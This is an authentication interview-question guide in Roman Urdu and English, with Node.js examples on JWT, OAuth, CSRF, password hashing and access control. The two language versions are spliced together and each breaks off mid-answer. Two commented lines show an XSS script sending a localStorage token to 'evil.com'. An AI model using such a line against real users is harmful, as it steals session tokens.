<!--LANG:roman-->

<!--LANG:roman-->

# Authentication Interview Questions

## 1. What is the difference between authentication and authorization?

**Asaan Urdu mein:**  
Authentication ka matlab hai user ki **pehchaan** ko verify karna – jaise password, fingerprint ya token se. Authorization phir decide karta hai ke us user ko **kya access** mil sakta hai – jaise roles ya permissions. Pehle authentication hota hai, uske baad hi authorization check hota hai.  

```javascript
// Authentication: verifying identity
function authenticateUser(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Missing token' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next(); // User is authenticated
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Authorization: checking permissions
function authorizeRole(...allowedRoles) {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

app.get('/admin', authenticateUser, authorizeRole('admin'), (req, res) => {
  res.json({ secret: 'admin data' });
});
```

---

## 2. What is JWT (JSON Web Token) and how does it work?

**Asaan Urdu mein:**  
JWT ek **compact** aur URL‑safe token hota hai jo claims ko JSON ke roop mein server aur client ke beech bhejta hai. Isme teen parts hoti hain – header, payload, aur signature. Server signature ko verify karke token ki **integrity** aur **authenticity** check karta hai.  

```javascript
const jwt = require('jsonwebtoken');

// Creating a JWT
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);
console.log(token); // eyJhbGciOiJIUzI1NiIs...

// Verifying a JWT
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  console.log(decoded.userId); // 123
} catch (err) {
  console.log('Token expired or invalid');
}
```

---

## 3. What is the difference between session-based and token-based authentication?

**Asaan Urdu mein:**  
Session‑based authentication mein server **session data** store karta hai (memory, Redis) aur client ko sirf ek session ID cookie milti hai – isse server stateful hota hai. Token‑based (usually JWT) mein user data token ke andar hota hai, isliye server **stateless** rehta hai aur horizontally scale karna asaan hota hai.  

```javascript
// Session-based (Express + express-session)
const session = require('express-session');
app.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));
app.post('/login', (req, res) => {
  req.session.userId = 123; // Stored server-side
  res.json({ ok: true });
});
app.get('/profile', (req, res) => {
  if (!req.session.userId) return res.status(401).end();
  res.json({ userId: req.session.userId });
});

// Token-based (JWT)
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '1h' });
  res.json({ token }); // Client stores this
});
app.get('/profile', authenticateToken, (req, res) => {
  res.json({ userId: req.user.userId }); // Decoded from token
});
```

---

## 4. What are the parts of a JWT (header, payload, signature)?

**Asaan Urdu mein:**  
JWT teen Base64URL encoded parts se milkar banta hai – **Header** (algorithm aur token type), **Payload** (claims jaise `exp`, `iat`, `userId`), aur **Signature** jo header+payload ko secret key se hash karke banayi jati hai. Signature token ki integrity ko protect karta hai.  

```javascript
// Manually decoding a JWT to see its parts
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwMDM2MDB9.signature';

// Part 1 - Header (algorithm + type)
const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString());
console.log(header); // { "alg": "HS256", "typ": "JWT" }

// Part 2 - Payload (claims)
const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
console.log(payload); // { "userId": 123, "role": "admin", "iat": 1700000000, "exp": 1700003600 }

// Part 3 - Signature (verification)
const crypto = require('crypto');
const data = token.split('.').slice(0, 2).join('.');
const expectedSig = crypto.createHmac('sha256', SECRET).update(data).digest('base64url');
const isValid = expectedSig === token.split('.')[2];
```

---

## 5. How do you securely store JWTs on the client (localStorage vs httpOnly cookies)?

**Asaan Urdu mein:**  
httpOnly cookies zyada secure hoti hain kyunki JavaScript unko access nahi kar sakta – isse XSS attacks se token chori mushkil ho jati hai. localStorage har JS script se read ho sakti hai, isliye XSS ke liye vulnerable hai. Production mein **httpOnly, Secure, SameSite=Strict** cookies use karen. Agar localStorage hi use karna ho, to token expiry ko bahut chhota rakhen aur CSRF safe design adopt karen.  

```javascript
// Server: set JWT in httpOnly cookie
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '1h' });
  res.cookie('jwt', token, {
    httpOnly: true,      // JS cannot access this cookie
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour in ms
  });
  res.json({ message: 'Logged in' });
});

// Client: cannot read cookie, but it's sent automatically
fetch('/api/profile', { credentials: 'include' });

// ❌ Insecure: localStorage (vulnerable to XSS)
localStorage.setItem('jwt', token);
// An XSS script can steal it: fetch('https://evil.com/steal?t=' + localStorage.getItem('jwt'));
```

---

## 6. What is OAuth 2.0 and how does the authorization code flow work?

**Asaan Urdu mein:**  
OAuth 2.0 ek **authorization framework** hai jo third‑party apps ko limited access dene ke liye use hota hai. Authorization Code flow mein client user ko authorization server pe redirect karta hai, user consent dene ke baad server ek **authorization code** return karta hai. Client phir is code ko apne **client secret** ke saath exchange karke **access token** le leta hai – token user agent ko directly expose nahi hota.  

```javascript
// Step 1: Redirect user to authorization server
const authUrl = `https://accounts.example.com/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${CALLBACK_URL}&scope=read&state=${crypto.randomUUID()}`;
res.redirect(authUrl);

// Step 2: Callback endpoint receives the authorization code
app.get('/callback', async (req, res) => {
  const { code, state } = req.query;

  // Step 3: Exchange code for access token (server-side)
  const tokenResponse = await fetch('https://accounts.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      grant_type: 'authorization_code',
      code,
      redirect_uri: CALLBACK_URL,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET // Never exposed to browser
    })
  });
  const { access_token, refresh_token } = await tokenResponse.json();

  // Step 4: Use access token to fetch resources
  const userData = await fetch('https://api.example.com/user', {
    headers: { Authorization: `Bearer ${access_token}` }
  }).then(r => r.json());

  res.json({ user: userData });
});
```

---

## 7. What is the difference between OAuth and OpenID Connect?

**Asaan Urdu mein:**  
OAuth 2.0 sirf **authorization** provide karta hai – yani koi app aapke resources (calendar, contacts) read/write kar sakti hai. OpenID Connect (OIDC) OAuth ke upar **authentication** layer add karta hai, jisme ek **ID token** (JWT) hota hai jo user ki identity claims (name, email, sub) carry karta hai. OAuth kehte hai “app ko aapke calendar tak access mil gaya”, OIDC kehte hai “ye user Alice hai, email alice@example.com”.  

```javascript
// OAuth 2.0: Access token for API access (no user identity guaranteed)
const oauthResponse = await fetch('https://api.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET
  })
});
const { access_token } = await oauthResponse.json();

// OpenID Connect: adds id_token with verified user info
const oidcResponse = await fetch('https://accounts.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    scope: 'openid profile email'  // 'openid' triggers OIDC
  })
});
const { access_token, id_token } = await oidcResponse.json();
// Decode id_token (it's a JWT)
const userInfo = jwt.decode(id_token);
console.log(userInfo.sub, userInfo.email, userInfo.name);
// '12345', 'alice@example.com', 'Alice Smith'
```

---

## 8. What is refresh token rotation and why is it used?

**Asaan Urdu mein:**  
Refresh token rotation ka matlab hai har baar jab refresh token use hota hai, **naya refresh token** issue karna aur purana invalidate kar dena. Agar koi attacker ne token chura liya ho, to legitimate user ke use se purana token turant invalid ho jata hai, isse theft ka window bahut chhota ho jata hai.  

```javascript
// Server-side refresh token rotation
const refreshTokens = new Map(); // In production, use DB/Redis

app.post('/token', async (req, res) => {
  const { refresh_token } = req.body;

  // Look up current refresh token
  const tokenData = refreshTokens.get(refresh_token);
  if (!tokenData) return res.status(401).json({ error: 'Invalid refresh token' });

  // Issue new access token
  const newAccessToken = jwt.sign(
    { userId: tokenData.userId },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  // Rotate: issue new refresh token, invalidate old one
  const newRefreshToken = crypto.randomUUID();
  refreshTokens.delete(refresh_token);                 // Invalidate old
  refreshTokens.set(newRefreshToken, {                 // Issue new
    userId: tokenData.userId,
    createdAt: Date.now()
  });

  res.json({ access_token: newAccessToken, refresh_token: newRefreshToken });
});
```

---

## 9. What is CSRF and how do you protect against it?

**Asaan Urdu mein:**  
Cross‑Site Request Forgery (CSRF) attacker ko aapke authenticated browser se **unwanted actions** karne par majboor karta hai. Protection ke liye anti‑CSRF tokens (synchronizer pattern), **SameSite** cookies (Strict/Lax), aur custom headers (e.g., `X‑Requested‑With`) use karte hain. APIs ke liye GET/HEAD safe methods rakhein aur state‑changing requests me token zaroori banayein.  

```javascript
// Server: generate CSRF token
const csrfTokens = new Set();

app.get('/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  csrfTokens.add(token);
  res.cookie('csrf-token', token, { httpOnly: true, sameSite: 'strict' });
  res.json({ csrfToken: token });
});

// Server: validate CSRF token on state-changing requests
app.post('/transfer', (req, res) => {
  const csrfToken = req.headers['x-csrf-token'];
  if (!csrfToken || !csrfTokens.has(csrfToken)) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  csrfTokens.delete(csrfToken); // One-time use
  // Process transfer...
});

// Client-side: include token in header
const { csrfToken } = await (await fetch('/csrf-token', { credentials: 'include' })).json();
await fetch('/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ to: 'bob', amount: 100 })
});
```

---

## 10. What is the difference between access tokens and refresh tokens?

**Asaan Urdu mein:**  
**Access token** short‑lived hota hai (15‑60 minutes) aur har API request ko authenticate karta hai – isko sirf Authorization header me bhejna chahiye. **Refresh token** long‑lived (days‑months) hota hai, sirf naya access token lene ke liye use hota hai, aur server‑side securely store ya hash karke rakha jata hai. Refresh token ko revoke bhi kiya ja sakta hai.  

```javascript
const jwt = require('jsonwebtoken');

// Issue both tokens on login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  // Short-lived access token (15 min)
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  // Long-lived refresh token (7 days)
  const refreshToken = crypto.randomUUID();
  await db.query(
    'INSERT INTO refresh_tokens (token, user_id, expires_at) VALUES ($1, $2, NOW() + INTERVAL \'7 days\')',
    [refreshToken, user.id]
  );

  res.json({ access_token: accessToken, refresh_token: refreshToken });
});

// Use refresh token to get new access token
app.post('/refresh', async (req, res) => {
  const { refresh_token } = req.body;
  const stored = await db.query(
    'SELECT * FROM refresh_tokens WHERE token = $1 AND expires_at > NOW()',
    [refresh_token]
  );
  if (!stored.rows.length) return res.status(401).end();

  const newAccessToken = jwt.sign(
    { userId: stored.rows[0].user_id },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ access_token: newAccessToken });
});
```

---

## 11. How do you implement password hashing securely (e.g., bcrypt)?

**Asaan Urdu mein:**  
Password hashing ke liye **slow aur adaptive** algorithm use karen – bcrypt, argon2 ya scrypt. bcrypt automatically **salt** generate karta hai aur cost factor set karta hai (10‑12 typical). Password ko kabhi plain text me store ya log na karein. Cost factor ko aise set karein ke server ki response time acceptable ho.  

```javascript
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Registration: hash password before storing
async function registerUser(email, password) {
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
  // bcrypt.hash generates its own salt automatically
  await db.query('INSERT INTO users (email, password_hash) VALUES ($1, $2)', [email, hashedPassword]);
}

// Login: compare password against hash
async function authenticateUser(email, password) {
  const { rows } = await db.query('SELECT * FROM users WHERE email = $1', [email]);
  if (!rows.length) return null;

  const user = rows[0];
  const match = await bcrypt.compare(password, user.password_hash);
  // bcrypt.compare extracts the salt from the stored hash
  return match ? user : null;
}

// Verify the hash format:
console.log(hashedPassword);
// $2b$12$RzLq.... -- $2b$ = algorithm, 12 = cost, rest = salt+hash
```

---

## 12. What is multi-factor authentication (MFA) and how does it improve security?

**Asaan Urdu mein:**  
MFA me **do ya zyada factors** istemal hote hain – kuch jo aap jaante hain (password), kuch jo aapke paas hota hai (OTP app, SMS), ya kuch jo aap hain (fingerprint). Agar attacker sirf password chura le, tab bhi uske paas second factor nahi hota, isliye account takeover ka risk bahut kam ho jata hai.  

```javascript
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

// Setup: generate a secret for the user
const secret = speakeasy.generateSecret({ name: 'MyApp:alice@example.com' });
await db.query('UPDATE users SET totp_secret = $1 WHERE email = $2', [secret.base32, 'alice@example.com']);

// Show QR code to user (to add to authenticator app)
const qrDataUrl = await qrcode.toDataURL(secret.otpauth_url);

// Verify: check the token from user's authenticator app
app.post('/verify-mfa', async (req, res) => {
  const { email, token } = req.body;
  const { rows } = await db.query('SELECT totp_secret FROM users WHERE email = $1', [email]);

  const verified = speakeasy.totp.verify({
    secret: rows[0].totp_secret,
    encoding: 'base32',
    token,
    window: 1 // Allow 30s clock drift
  });

  if (!verified) return res.status(401).json({ error: 'Invalid MFA code' });
  // Proceed to issue tokens
});
```

---

## 13. What is Single Sign-On (SSO) and how does it work?

**Asaan Urdu mein:**  
SSO se user ek hi **login** se multiple independent applications access kar sakta hai. Centralized **Identity Provider (IdP)** SAML, OAuth ya OpenID Connect ke through signed assertion ya token issue karta hai. Downstream services us token ko trust karte hain, isse password fatigue aur phishing surface kam hota hai.  

```javascript
// Service Provider validates token from Identity Provider
app.post('/sso/login', async (req, res) => {
  const { id_token } = req.body;

  // Verify the ID token from the IdP (e.g., Google, Auth0, Okta)
  const decoded = jwt.verify(id_token, IDP_PUBLIC_KEY, {
    issuer: 'https://accounts.myidp.com',
    audience: CLIENT_ID
  });

  // Check if user exists in our system, create if not
  let user = await db.query('SELECT * FROM users WHERE sso_id = $1', [decoded.sub]);
  if (!user.rows.length) {
    user = await db.query(
      'INSERT INTO users (sso_id, email, name) VALUES ($1, $2, $3) RETURNING *',
      [decoded.sub, decoded.email, decoded.name]
    );
  }

  // Issue our own session token
  const sessionToken = jwt.sign({ userId: user.rows[0].id }, APP_SECRET, { expiresIn: '1h' });
  res.json({ token: sessionToken });
});
```

---

## 14. What is the difference between stateless and stateful authentication?

**Asaan Urdu mein:**  
**Stateful** authentication server par session data (DB, Redis) store karta hai aur client ko session ID cookie deta hai – har request pe server ko session lookup karna padta hai. **Stateless** authentication (JWT) me saari user info token me hoti hai, server sirf signature verify karta hai, koi server‑side storage nahi hoti. Stateless scaling asaan hoti hai, lekin instant revocation ke liye blacklist ki zarurat padti hai.  

```javascript
// Stateful: server stores session data in Redis
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  const sessionId = crypto.randomUUID();
  await redis.set(`session:${sessionId}`, JSON.stringify({ userId: user.id, role: user.role }), 'EX', 86400);
  res.cookie('session_id', sessionId, { httpOnly: true });
});

app.get('/profile', async (req, res) => {
  const session = await redis.get(`session:${req.cookies.session_id}`);
  if (!session) return res.status(401).end();
  const user = JSON.parse(session);
  // Can revoke instantly: redis.del(`session:${sessionId}`)
  res.json({ userId: user.userId });
});

// Stateless: all data in JWT, can't revoke without a blacklist
app.post('/login', (req, res) => {
  const user = authenticate(req.body);
  const token = jwt.sign({ userId: user.id, role: user.role }, SECRET, { expiresIn: '1h' });
  res.json({ token });
});

app.get('/profile', authenticateToken, (req, res) => {
  // Validate signature only — no DB/Redis lookup
  res.json({ userId: req.user.userId });
});
```

---

## 15. How would you implement role-based access control (RBAC)?

**Asaan Urdu mein:**  
RBAC me **users → roles → permissions** ka mapping hota hai. Users ko ek ya zyada roles assign kiye jate hain, aur har role ke paas specific permissions hoti hain. Middleware me user ke roles ko fetch kar ke required permission ke against check karte hain. Efficient implementation ke liye bitmask ya string‑based permission sets bhi use kiye ja sakte hain.  

```javascript
// Database schema
// users(id, name)
// roles(id, name)
// permissions(id, resource, action)
// user_roles(user_id, role_id)
// role_permissions(role_id, permission_id)

// Middleware for RBAC
const rolePermissions = {
  admin: ['user:read', 'user:write', 'user:delete', 'report:read'],
  editor: ['user:read', 'post:write', 'post:publish'],
  viewer: ['user:read', 'post:read']
};

function requirePermission(requiredPermission) {
  return async (req, res, next) => {
    const { rows } = await db.query(`
      SELECT r.name FROM users u
      JOIN user_roles ur ON ur.user_id = u.id
      JOIN roles r ON r.id = ur.role_id
      WHERE u.id = $1
    `, [req.user.userId]);

    const userRoles = rows.map(r => r.name);
    const hasPermission = userRoles.some(role =>
      rolePermissions[role]?.includes(requiredPermission)
    );

    if (!hasPermission) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Usage
app.get('/api/users', authenticateToken, requirePermission('user:read'), getUsers);
app.delete('/api/users/:id', authenticateToken, requirePermission('user:delete'), deleteUser);
```

---

## 16. What is a salt in password hashing and why is it important?

**Asaan Urdu mein:**  
**Salt** ek random, unique value hoti hai jo password ke saath **prepend** ya **append** ki jati hai hashing se pehle. Isse same password ke liye har user ka hash alag aata hai, jo **rainbow table** attacks ko rokti hai. Modern libraries (bcrypt, argon2) salt ko automatically generate kar ke hash string ke andar embed kar deti hain.  

```javascript
const bcrypt = require('bcrypt');

// Manual demonstration (bcrypt does this internally)
const crypto = require('crypto');

// Generate a random salt
const salt = crypto.randomBytes(16).toString('hex');
console.log(salt); // e.g., 'a7f3c1b2...'

// Hash password + salt using PBKDF2
crypto.pbkdf2('mypassword', salt, 100000, 64, 'sha512', (err, derivedKey) => {
  const hash = derivedKey.toString('hex');
  // Store salt + hash together
  const stored = `${salt}:${hash}`;
  console.log(stored); // 'a7f3c1b2...:9e4a2d...'
});

// With bcrypt (salt is auto-generated and embedded)
const hash = await bcrypt.hash('mypassword', 12);
console.log(hash);
// $2b$12$a7f3c1b2...9e4a2d...
// The salt is part of the output string (first 22 chars after cost)
```

---

## 17. What is the risk of storing JWTs in localStorage vs cookies?

**Asaan Urdu mein:**  
localStorage **JavaScript** se read ki ja sakti hai, isliye XSS attack me attacker token ko asani se chura sakta hai. httpOnly cookies **JavaScript inaccessible** hoti hain, isse XSS based token theft nahi hoti, lekin agar SameSite set na ho to CSRF ka risk hota hai. Best practice: httpOnly, Secure, SameSite=Strict cookies use karen, ya split‑token approach (access token memory me, refresh token httpOnly cookie).  

```javascript
// ❌ Vulnerable to XSS:
localStorage.setItem('token', jwt);
// Attacker's injected script:
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))</script>

// ✅ Safer: httpOnly cookie
res.cookie('token', jwt, {
  httpOnly: true,   // JS cannot read it
  secure: true,     // HTTPS only
  sameSite: 'strict' // CSRF protection
});

// ✅ Even better: split token approach
// Access token in memory (not persisted), refresh token in httpOnly cookie
let accessToken = null;
app.post('/login', (req, res) => {
  accessToken = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ userId: 123 }, REFRESH_SECRET, { expiresIn: '7d' });
  res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true, sameSite: 'strict' });
  res.json({ accessToken }); // Stays in memory
});
```

---

## 18. How do social login flows (Google, Facebook OAuth) typically work?

**Asaan Urdu mein:**  
Social login OAuth 2.0 / OpenID Connect par based hota hai. App user ko provider ke consent page pe redirect karta hai, user authenticate karta hai, provider **authorization code** return karta hai. Server is code ko exchange karke **access token** aur **ID token** le leta hai, jisse user ki identity (email, name, picture) milti hai. Fir local database me user ko create ya link karte hain aur apna session token issue karte hain.  

```javascript
const { OAuth2Client } = require('google-auth-library');
const client = new OAuth2Client(GOOGLE_CLIENT_ID);

// Route: redirect to Google
app.get('/auth/google', (req, res) => {
  const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${CALLBACK_URL}&response_type=code&scope=openid%20email%20profile`;
  res.redirect(url);
});

// Callback: handle the code exchange
app.get('/auth/google/callback', async (req, res) => {
  const { code } = req.query;

  // Exchange code for tokens
  const { tokens } = await client.getToken(code);

  // Verify ID token
  const ticket = await client.verifyIdToken({
    idToken: tokens.id_token,
    audience: GOOGLE_CLIENT_ID
  });

  const payload = ticket.getPayload();
  // payload.sub, payload.email, payload.name, payload.picture

  // Find or create user in local DB
  let user = await db.query('SELECT * FROM users WHERE google_id = $1', [payload.sub]);
  if (!user.rows.length) {
    user = await db.query(
      'INSERT INTO users (google_id, email, name, avatar_url) VALUES ($1, $2, $3, $4) RETURNING *',
      [payload.sub, payload.email, payload.name, payload.picture]
    );
  }

  // Issue local session token
  const token = jwt.sign({ userId: user.rows[0].id }, APP_SECRET, { expiresIn: '7d' });
  res.json({ token, user: payload.name });
});
```

---

## 19. What is token expiration and why is it important for security?

**Asaan Urdu mein:**  
Token expiration ek **time limit** set karta hai jiske baad token **invalid** ho jata hai. Short expiration (15‑60 minutes for access tokens) attacker ke liye stolen token ka misuse window bahut chhota kar deta hai. Server `exp` claim ko check karta hai, aur expired token ko reject kar deta hai. Refresh token ke liye longer expiry hoti hai, lekin woh bhi revocable hota hai.  

```javascript
const jwt = require('jsonwebtoken');

// Issue token with expiration
const token = jwt.sign(
  { userId: 123 },
  SECRET,
  { expiresIn: '15m' } // or { expiresIn: 900 } (seconds)
);

// Verify respects expiration automatically
try {
  const decoded = jwt.verify(token, SECRET);
  console.log('Valid until:', new Date(decoded.exp * 1000));
} catch (err) {
  if (err.name === 'TokenExpiredError') {
    console.log('Token expired at:', err.expiredAt);
    // Client should use refresh token to get a new access token
  }
}

// Manual expiration check
const decoded = jwt.decode(token); // No verification
const isExpired = Date.now() >= decoded.exp * 1000;
if (isExpired) {
  // Token expired — reject
}

// Best practice: short access token, longer refresh token
const accessToken = jwt.sign({ userId: 123 }, ACCESS_SECRET, { expiresIn: '15m' });
const refreshToken = jwt.sign({ userId: 123 }, REFRESH_SECRET, { expiresIn: '7d' });
```

---

## 20. How would you implement 'remember me' functionality securely?

**Asaan Urdu mein:**  
'Remember me' ke liye **persistent random token** httpOnly cookie me store karen, aur uska **hashed** version database me. Jab cookie milti hai, hashed token ko compare kar ke user ko re‑authenticate karen, aur token ko rotate (purana delete, naya issue) karen. Cookie ka maxAge 30 din set karein, aur device fingerprint ya user‑agent se extra verification add karen.  

```javascript
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// Login with "remember me"
app.post('/login', async (req, res) => {
  const { email, password, rememberMe } = req.body;

<!--LANG:english-->

# Authentication Interview Questions

## 1. What is the difference between authentication and authorization?

Authentication verifies *who* a user is (identity verification via credentials like passwords, biometrics, or tokens). Authorization determines *what* a user can access (permissions, roles, and scopes). Authentication always precedes authorization — you must prove identity before checking permissions.

```javascript
// Authentication: verifying identity
function authenticateUser(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Missing token' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next(); // User is authenticated
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Authorization: checking permissions
function authorizeRole(...allowedRoles) {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

app.get('/admin', authenticateUser, authorizeRole('admin'), (req, res) => {
  res.json({ secret: 'admin data' });
});
```

---

## 2. What is JWT (JSON Web Token) and how does it work?

JWT is a compact, URL-safe token format for transmitting claims between parties as a JSON object. It works by encoding a header (algorithm, type), payload (claims like userId, role, exp), and a signature created by hashing the header+payload with a secret key. The server verifies the signature on each request to ensure the token hasn't been tampered with.

```javascript
const jwt = require('jsonwebtoken');

// Creating a JWT
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);
console.log(token); // eyJhbGciOiJIUzI1NiIs...

// Verifying a JWT
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  console.log(decoded.userId); // 123
} catch (err) {
  console.log('Token expired or invalid');
}
```

---

## 3. What is the difference between session-based and token-based authentication?

Session-based auth stores session data on the server (memory or Redis) and sends a session ID cookie to the client — the server is stateful. Token-based auth (typically JWT) encodes user data in a self-contained token that the client sends with each request — the server is stateless. Tokens scale better horizontally but cannot be revoked server-side easily.

```javascript
// Session-based (Express + express-session)
const session = require('express-session');
app.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));
app.post('/login', (req, res) => {
  req.session.userId = 123; // Stored server-side
  res.json({ ok: true });
});
app.get('/profile', (req, res) => {
  if (!req.session.userId) return res.status(401).end();
  res.json({ userId: req.session.userId });
});

// Token-based (JWT)
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '1h' });
  res.json({ token }); // Client stores this
});
app.get('/profile', authenticateToken, (req, res) => {
  res.json({ userId: req.user.userId }); // Decoded from token
});
```

---

## 4. What are the parts of a JWT (header, payload, signature)?

A JWT has three Base64URL-encoded parts separated by dots: the Header (algorithm and token type), Payload (claims — data and metadata like `exp`, `iat`), and Signature (HMAC-SHA256 or RSA hash of header+payload using a secret key). The signature ensures integrity: if the payload changes, the signature becomes invalid.

```javascript
// Manually decoding a JWT to see its parts
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjE3MDAwMDM2MDB9.signature';

// Part 1 - Header (algorithm + type)
const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString());
console.log(header); // { "alg": "HS256", "typ": "JWT" }

// Part 2 - Payload (claims)
const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
console.log(payload); // { "userId": 123, "role": "admin", "iat": 1700000000, "exp": 1700003600 }

// Part 3 - Signature (verification)
const crypto = require('crypto');
const data = token.split('.').slice(0, 2).join('.');
const expectedSig = crypto.createHmac('sha256', SECRET).update(data).digest('base64url');
const isValid = expectedSig === token.split('.')[2];
```

---

## 5. How do you securely store JWTs on the client (localStorage vs httpOnly cookies)?

httpOnly cookies are more secure because JavaScript cannot access them, preventing XSS-based token theft. localStorage is accessible via any JS running on the page, making it vulnerable to XSS attacks. Use httpOnly, Secure, SameSite=Strict cookies for production. If you must use localStorage, pair it with a CSRF-safe design and short token expiration.

```javascript
// Server: set JWT in httpOnly cookie
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: 123 }, SECRET, { expiresIn: '1h' });
  res.cookie('jwt', token, {
    httpOnly: true,      // JS cannot access this cookie
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour in ms
  });
  res.json({ message: 'Logged in' });
});

// Client: cannot read cookie, but it's sent automatically
fetch('/api/profile', { credentials: 'include' });

// ❌ Insecure: localStorage (vulnerable to XSS)
localStorage.setItem('jwt', token);
// An XSS script can steal it: fetch('https://evil.com/steal?t=' + localStorage.getItem('jwt'));
```

---

## 6. What is OAuth 2.0 and how does the authorization code flow work?

OAuth 2.0 is an authorization framework that allows third-party apps to obtain limited access to resources on behalf of a user. In the Authorization Code flow, the client redirects the user to the authorization server, which returns an authorization code after user consent. The client exchanges this code (along with its client secret) for an access token, preventing the token from being exposed to the user agent.

```javascript
// Step 1: Redirect user to authorization server
const authUrl = `https://accounts.example.com/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${CALLBACK_URL}&scope=read&state=${crypto.randomUUID()}`;
res.redirect(authUrl);

// Step 2: Callback endpoint receives the authorization code
app.get('/callback', async (req, res) => {
  const { code, state } = req.query;

  // Step 3: Exchange code for access token (server-side)
  const tokenResponse = await fetch('https://accounts.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      grant_type: 'authorization_code',
      code,
      redirect_uri: CALLBACK_URL,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET // Never exposed to browser
    })
  });
  const { access_token, refresh_token } = await tokenResponse.json();

  // Step 4: Use access token to fetch resources
  const userData = await fetch('https://api.example.com/user', {
    headers: { Authorization: `Bearer ${access_token}` }
  }).then(r => r.json());

  res.json({ user: userData });
});
```

---

## 7. What is the difference between OAuth and OpenID Connect?

OAuth 2.0 is an *authorization* framework — it provides access to resources (APIs). OpenID Connect (OIDC) is an *authentication* layer built on top of OAuth 2.0 that adds an ID token (a JWT containing user identity claims like name, email, sub). OAuth says "this app can read your calendar"; OIDC says "this user is Alice with email alice@example.com".

```javascript
// OAuth 2.0: Access token for API access (no user identity guaranteed)
const oauthResponse = await fetch('https://api.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET
  })
});
const { access_token } = await oauthResponse.json();

// OpenID Connect: adds id_token with verified user info
const oidcResponse = await fetch('https://accounts.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code,
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    scope: 'openid profile email'  // 'openid' triggers OIDC
  })
});
const { access_token, id_token } = await oidcResponse.json();
// Decode id_token (it's a JWT)
const userInfo = jwt.decode(id_token);
console.log(userInfo.sub, userInfo.email, userInfo.name);
// '12345', 'alice@example.com', 'Alice Smith'
```

---

## 8. What is refresh token rotation and why is it used?

Refresh token rotation replaces the refresh token each time it's used to obtain a new access token. If a refresh token is stolen and the legitimate user uses it, the old token becomes invalid, alerting the system to token theft. This limits the window of vulnerability because stolen tokens become stale after one use.

```javascript
